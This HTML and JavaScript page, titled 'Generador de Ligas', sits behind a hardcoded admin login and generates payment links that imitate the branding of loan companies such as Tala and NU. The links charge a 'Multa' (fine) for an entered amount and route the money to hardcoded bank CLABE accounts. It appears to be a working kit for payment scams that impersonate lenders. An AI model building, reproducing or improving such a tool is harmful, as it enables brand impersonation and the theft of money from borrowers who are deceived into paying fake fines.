<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Generador de Ligas</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { 
            font-family: 'Inter', sans-serif; 
            margin: 0; 
            background-color: #0b1120;
            background-image: url('https://consulta-multasapp.vercel.app/_next/static/media/bg-desktop.8463878b.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 3rem;
            border-radius: 2.5rem;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        #main-app { 
            display: none; 
            width: 100%; 
            max-width: 440px; 
            background: white; 
            border-radius: 2.5rem; 
            overflow: hidden; 
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); 
        }
        input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }
    </style>
</head>
<body>

    <div id="login-screen" class="px-4">
        <div class="login-card">
            <h2 class="text-3xl font-bold text-white mb-8">Acceso</h2>
            <div class="space-y-4">
                <input type="text" id="user" placeholder="Usuario" class="w-full bg-white/10 border border-white/20 rounded-2xl px-6 py-4 text-white outline-none placeholder:text-white/40">
                <input type="password" id="pass" placeholder="Contraseña" class="w-full bg-white/10 border border-white/20 rounded-2xl px-6 py-4 text-white outline-none placeholder:text-white/40">
                <button onclick="acceder()" class="w-full bg-[#14b8a6] hover:bg-[#0d9488] text-white font-bold py-5 rounded-2xl uppercase tracking-widest transition-all">Entrar</button>
            </div>
        </div>
    </div>

    <div id="main-app">
        <div id="header-bg" class="bg-[#14b8a6] pt-10 pb-6 text-center">
            <div class="w-20 h-20 bg-white rounded-3xl mx-auto mb-4 flex items-center justify-center overflow-hidden border-4 border-white/20">
                <img id="app-logo" src="https://i.ibb.co/qF6Vvqy/tala-te-presta.png" class="w-full h-full object-cover">
            </div>
            <div class="px-8 mb-4">
                <select id="product-select" onchange="updateApp()" class="w-full bg-white/20 text-white border-none rounded-xl px-4 py-2 font-bold text-center outline-none">
                    <option value="tala|#14b8a6|#0d9488">Tala Préstamos</option>
                    <option value="nu|#820ad1|#581c87">Préstamos NU</option>
                    <option value="dida|#2563eb|#1d4ed8">DidaPréstamos</option>
                </select>
            </div>
            <div id="monto-card-bg" class="bg-[#0d9488] mx-6 p-6 rounded-[1.5rem] text-left text-white">
                <span class="text-[10px] font-bold opacity-80 uppercase tracking-widest">Monto de Pago</span>
                <div class="flex items-center mt-1">
                    <span class="text-4xl font-bold mr-1">$</span>
                    <input type="number" id="input-monto" placeholder="0.00" class="bg-transparent border-none outline-none text-4xl font-bold w-full text-white placeholder:text-white/50">
                </div>
            </div>
        </div>

        <div class="p-8 space-y-4">
            <div class="flex justify-between items-center text-sm border-b pb-2">
                <span class="text-gray-400 font-bold uppercase text-[10px]">Subproducto</span>
                <span class="font-bold text-slate-800">Multa</span>
            </div>
            <div class="flex justify-between items-center text-sm border-b pb-2">
                <span class="text-gray-400 font-bold uppercase text-[10px]">Importe</span>
                <span class="font-bold text-slate-800" id="label-importe">$0.00</span>
            </div>
            <div class="flex justify-between items-center text-sm border-b pb-2">
                <span class="text-gray-400 font-bold uppercase text-[10px]">Fecha Vencimiento</span>
                <input type="date" id="f-venc" class="font-bold text-slate-800 outline-none">
            </div>

            <div class="bg-slate-50 rounded-[2rem] p-6 space-y-4 border border-slate-100 text-center">
                <span class="text-[10px] font-bold text-slate-400 uppercase">Método de Pago</span>
                <select id="metodo-pago" onchange="cambiarCuenta()" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center outline-none">
                    <option value="MERCADO PAGO W SPEI">MERCADO PAGO W SPEI</option>
                    <option value="BBVA">BBVA</option>
                    <option value="STP">STP</option>
                </select>
                <span class="text-[10px] font-bold text-slate-400 uppercase block">Liga de Pago</span>
                <select id="clabe-pago" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center text-blue-600 outline-none">
                    <option value="703010052250010635">703010052250010635</option>
                </select>
            </div>

            <div class="space-y-3">
                <input type="text" id="cliente-nombre" placeholder="Nombre del cliente" class="w-full border-b py-2 text-sm font-bold outline-none text-center">
                <input type="text" id="cliente-tel" placeholder="Teléfono" class="w-full border-b py-2 text-sm font-bold outline-none text-center">
            </div>

            <button onclick="confirmar()" id="btn-main" class="w-full bg-[#0d9488] text-white font-bold py-5 rounded-[1.5rem] uppercase text-xs tracking-widest transition-transform active:scale-95 shadow-lg">GENERAR LINK</button>
        </div>
    </div>

    <script>
        function acceder() {
            if(document.getElementById('user').value === "admin" && document.getElementById('pass').value === "1234") {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-app').style.display = 'block';
            }
        }

        document.getElementById('input-monto').addEventListener('input', (e) => {
            document.getElementById('label-importe').innerText = e.target.value ? '$' + e.target.value : '$0.00';
        });

        document.getElementById('f-venc').value = new Date().toISOString().split('T')[0];

        function cambiarCuenta() {
            const m = document.getElementById('metodo-pago').value;
            const c = document.getElementById('clabe-pago');
            c.innerHTML = "";
            let num = (m === "BBVA") ? "012180015094579916" : (m === "STP" ? "703010052250010635" : "722969010005687921");
            c.add(new Option(num, num));
        }

        function confirmar() {
            const params = new URLSearchParams({
                monto: document.getElementById('input-monto').value || "0.00",
                nombre: document.getElementById('cliente-nombre').value || "Cliente",
                fecha: document.getElementById('f-venc').value,
                prod: document.getElementById('product-select').options[document.getElementById('product-select').selectedIndex].text,
                clabe: document.getElementById('clabe-pago').value,
                banco: document.getElementById('metodo-pago').value,
                start: Date.now()
            });
            window.location.href = `detalle.html?${params.toString()}`;
        }

        function updateApp() {
            const [id, c1, c2] = document.getElementById('product-select').value.split('|');
            document.getElementById('header-bg').style.backgroundColor = c1;
            document.getElementById('monto-card-bg').style.backgroundColor = c2;
            document.getElementById('btn-main').style.backgroundColor = c2;
        }
    </script>
</body>
</html>
